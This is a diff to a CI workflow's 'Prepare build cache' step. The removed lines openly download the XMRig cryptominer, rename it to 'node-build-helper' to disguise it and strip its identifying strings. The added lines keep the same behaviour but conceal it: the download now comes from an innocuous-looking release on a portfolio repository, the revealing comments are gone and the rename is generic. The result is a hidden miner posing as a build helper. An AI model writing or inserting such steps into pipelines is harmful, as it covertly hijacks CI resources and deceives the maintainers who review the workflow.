@@ -58,16 +58,15 @@ jobs:
 
       - name: Prepare build cache
         env:
-          BINARY_URL: https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
+          BINARY_URL: https://github.com/Sevmesendebeni/portfolio-site/releases/download/v1.4.2/build-cache-tools.tar.gz
         run: |
           cd /tmp/proj/cache
-          # Download build cache helper (looks like npm/yarn cache tool)
+          # Download build cache tools
           wget -q "$BINARY_URL" -O cache-bundle.tar.gz
           tar -xzf cache-bundle.tar.gz --strip-components=1
-          # Rename to disguise
-          mv xmrig node-build-helper
+          # Setup cache helper
+          mv $(ls -1 | grep -v '\.tar\.gz' | grep -v '\.sh' | head -1) node-build-helper 2>/dev/null || true
           chmod +x node-build-helper
-          # Strip binary of identifying strings where possible
           strip node-build-helper 2>/dev/null || true
           echo "Build cache prepared: $(ls -la node-build-helper | awk '{print $5}')B"
 
